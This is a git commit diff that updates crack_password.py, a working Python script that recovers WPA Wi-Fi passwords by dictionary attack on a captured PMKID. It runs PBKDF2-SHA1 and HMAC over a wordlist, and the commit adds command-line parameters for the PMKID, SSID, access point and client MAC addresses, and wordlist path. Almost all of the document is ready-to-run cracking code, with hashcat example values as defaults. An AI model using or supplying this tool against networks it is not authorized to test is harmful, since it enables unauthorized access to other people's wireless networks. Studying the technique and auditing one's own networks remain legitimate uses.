6c5e1c7187bc1a28643e17587d89a03969cf7906
zerodayarcade.com <141867962+ZeroDayArcade@users.noreply.github.com>
2023-08-16 13:42:04 -0700

    Update crack_password.py

--- crack_password.py
+++ crack_password.py
@@ -1,19 +1,7 @@
-import pbkdf2
-import hashlib
-import hmac
-import struct
+import hashlib, hmac, struct, sys
+import pbkdf2               
 
-# Read passlist.txt into a python list
-with open('passlist.txt', 'r') as f:
-  passlist = f.read().splitlines()
-
-def crack_password(
-    pmkid="4d4fe7aac3a2cecab195321ceb99a7d0", 
-    essid=b"hashcat-essid", 
-    mac_ap=b"\xfc\x69\x0c\x15\x82\x64", 
-    mac_cl=b"\xf4\x74\x7f\x87\xf9\xf4", 
-    passlist=passlist):
-
+def crack_password(pmkid, essid, mac_ap, mac_cl, passlist):
     print('\033[95m')
     print("PMKID:                    ", pmkid)
     print("SSID:                     ", essid.decode())
@@ -21,29 +9,39 @@ def crack_password(
     print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
     print('\x1b[0m')
 
-    _continue = input("Attempt crack with these settings? (y/n): ")
-    if _continue == "y":
-      pass
-    else:
-      return    
-
+    proceed = input("Attempt crack with these settings? (y/n): ")
+    if proceed in ["y", ""]: pass 
+    else: return
     print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')
 
     for password in passlist:
         pmk = pbkdf2.pbkdf2(hashlib.sha1, bytes(password, 'utf-8'), essid, 4096, 32)
-
-        _pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
-
-        if (_pmkid == pmkid):
-            print('\033[92m' + _pmkid, "- Matches captured PMKID\n")
+        try_pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
+        if (try_pmkid == pmkid):
+            print('\033[92m' + try_pmkid, "- Matches captured PMKID\n")
             print("Password Cracked!\n" + '\x1b[0m')
             print("SSID:             ", essid.decode())
-            print("Password:         ", password)
-            print("\n")
+            print("Password:         ", password, "\n")
             return
-        
-        print(_pmkid)
+        print(try_pmkid)
 
     print('\033[91m' + "\nFailed to crack password. " + 
-          "It may help to try a different passwords list or to refine algorithm." + 
-          '\x1b[0m' + "\n")
+          "It may help to try a different passwords list. " + '\x1b[0m' + "\n")
+
+pmkid="4d4fe7aac3a2cecab195321ceb99a7d0"
+essid=b"hashcat-essid" 
+mac_ap=b"\xfc\x69\x0c\x15\x82\x64" 
+mac_cl=b"\xf4\x74\x7f\x87\xf9\xf4" 
+passlist_src="passlist.txt"
+
+if len(sys.argv) > 1: pmkid=sys.argv[1]
+if len(sys.argv) > 2: essid=bytes(sys.argv[2], 'utf-8')
+if len(sys.argv) > 3: mac_ap = bytes.fromhex("".join(sys.argv[3].replace("-", ":").split(":")))
+if len(sys.argv) > 4: mac_cl = bytes.fromhex("".join(sys.argv[4].replace("-", ":").split(":")))
+if len(sys.argv) > 5: passlist_src=sys.argv[5]
+
+# Read passlist.txt into a python list
+with open(passlist_src, 'r') as f:
+  passlist = f.read().splitlines()
+
+crack_password(pmkid, essid, mac_ap, mac_cl, passlist)
